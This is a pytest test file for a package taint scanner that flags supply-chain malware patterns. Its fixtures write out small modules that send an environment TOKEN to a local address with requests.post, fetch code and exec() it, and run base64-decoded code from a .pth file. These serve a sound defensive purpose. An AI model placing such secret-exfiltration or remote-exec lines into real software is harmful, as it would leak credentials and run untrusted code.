from lineage.inspect import package_taint as pt
from tests.fixtures.builders import make_malicious_package


def test_benign_package_has_no_flows(toy_package):
    assert pt.scan(toy_package) == [] and pt.slices(toy_package) == []


def test_env_to_network_flow_through_variables(tmp_path):
    fs = pt.scan(make_malicious_package(tmp_path / "evil"))
    envs = [f for f in fs if f.id == "PKG.TAINT.ENV_EXFIL"]
    assert len(envs) == 1
    assert [e.ref for e in envs[0].evidence] == ["evilpkg/core.py:6", "evilpkg/core.py:8"]


def test_decode_exec_in_pth_is_sliced(tmp_path):
    d = make_malicious_package(tmp_path / "evil")
    fs = {f.id: f for f in pt.scan(d)}
    assert fs["PKG.TAINT.ENCODED_EXEC"].severity == "critical"
    sl = [s for s in pt.slices(d) if s.file == "evilpkg_init.pth"]
    assert sl and sl[0].start == 1 and "exec(base64.b64decode" in sl[0].code


def test_slice_only_covers_the_flow(tmp_path):
    d = tmp_path / "p"
    d.mkdir()
    (d / "m.py").write_text(
        "import os, requests\n"
        "def noise():\n    return 1\n\n"
        "def leak():\n    x = 1\n    t = os.getenv('A')\n    y = 2\n    b = t.upper()\n    requests.post('http://127.0.0.1:9/', data=b)\n"
    )
    [s] = pt.slices(d)
    assert (s.start, s.end) == (7, 10) and "noise" not in s.code


def test_remote_code_exec(tmp_path):
    d = tmp_path / "p"
    d.mkdir()
    (d / "m.py").write_text("import requests\ncode = requests.get('http://127.0.0.1:9/x').text\nexec(code)\n")
    assert [f.id for f in pt.scan(d)] == ["PKG.TAINT.REMOTE_EXEC"]


def test_untainted_network_call_is_ignored(tmp_path):
    d = tmp_path / "p"
    d.mkdir()
    (d / "m.py").write_text("import requests\nrequests.post('http://127.0.0.1:9/', data={'a': 1})\n")
    assert pt.scan(d) == []


# --- R4.1: budgets ---
def _deep_loops(depth: int) -> str:
    body = "x = os.environ['TOKEN']\nrequests.post('http://127.0.0.1:9/', data=x)\n"
    for _ in range(depth):
        body = "for i in range(3):\n" + "".join("    " + l + "\n" for l in body.splitlines())
    return "import os\nimport requests\n\n" + body


def test_deeply_nested_loops_finish_quickly_and_still_find_the_flow(tmp_path):
    import time

    from lineage.inspect import package_taint

    pkg = tmp_path / "p"
    pkg.mkdir()
    (pkg / "m.py").write_text(_deep_loops(22))  # 2**22 body walks before the fix
    t0 = time.monotonic()
    fs = package_taint.scan(pkg)
    assert time.monotonic() - t0 < 10
    assert any(f.id.startswith("PKG.TAINT") for f in fs)


def test_wall_clock_budget_returns_partial_results_and_says_so(tmp_path, monkeypatch):
    from lineage.inspect import package_taint

    pkg = tmp_path / "p"
    pkg.mkdir()
    (pkg / "a.py").write_text("import os\nimport requests\nrequests.post('http://127.0.0.1:9/', data=os.environ['TOKEN'])\n")
    (pkg / "b.py").write_text("\n".join(f"v{i} = {i}" for i in range(3000)))
    monkeypatch.setenv("LINEAGE_TAINT_BUDGET_S", "0")
    monkeypatch.setattr(package_taint.Budget, "tick", lambda self: (_ for _ in ()).throw(package_taint.BudgetExceeded()) if self.deadline < __import__("time").monotonic() else None)
    fs = package_taint.scan(pkg)
    assert "CHECK.NOT_RUN.TAINT_PARTIAL" in {f.id for f in fs}


def test_file_cap_analyses_the_smallest_files_and_records_the_cap(tmp_path, monkeypatch):
    from lineage.inspect import package_taint

    pkg = tmp_path / "p"
    pkg.mkdir()
    for i in range(5):
        (pkg / f"f{i}.py").write_text("x = 1\n" * (i + 1))
    monkeypatch.setenv("LINEAGE_TAINT_MAX_FILES", "2")
    fs = package_taint.scan(pkg)
    assert any("2 smallest of 5" in f.title for f in fs if f.id == "CHECK.NOT_RUN.TAINT_PARTIAL")


def test_a_variable_reassigned_thousands_of_times_does_not_build_quadratic_taint(tmp_path):
    """The real hang (black, datasets): `x = f(x)` repeated made one new taint with a longer path per assignment."""
    import time

    from lineage.inspect import package_taint

    pkg = tmp_path / "p"
    pkg.mkdir()
    body = "import os\nx = os.environ['TOKEN']\n" + "".join(f"x = str(x) + 'a{i}'\n" for i in range(4000)) + "import requests\nrequests.post('http://127.0.0.1:9/', data=x)\n"
    (pkg / "m.py").write_text(body)
    t0 = time.monotonic()
    fs = package_taint.scan(pkg)
    assert time.monotonic() - t0 < 10 and any(f.id.startswith("PKG.TAINT") for f in fs)
